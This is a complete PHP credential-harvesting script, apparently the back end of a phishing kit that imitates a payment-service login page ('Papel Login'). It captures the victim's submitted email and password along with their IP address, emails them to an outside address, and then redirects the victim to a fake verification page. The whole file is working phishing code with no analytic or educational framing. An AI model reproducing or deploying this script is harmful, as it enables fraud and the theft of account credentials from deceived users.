<?php



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "==========[LOGIN INFOS]=========<br>\n";
$bilsmg .= "|login : ".$_POST['login_email']."<br>\n";
$bilsmg .= "|Password : ".$_POST['password']."<br>\n";
$bilsmg .= "=============[INFOS]============<br>\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "administrator@secure1client.com";
$bilsub = "Papel Login | From $ip";
$bilhead = "From:Masuk Mapel <Don>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../verify.html";
header("location:$src");
?>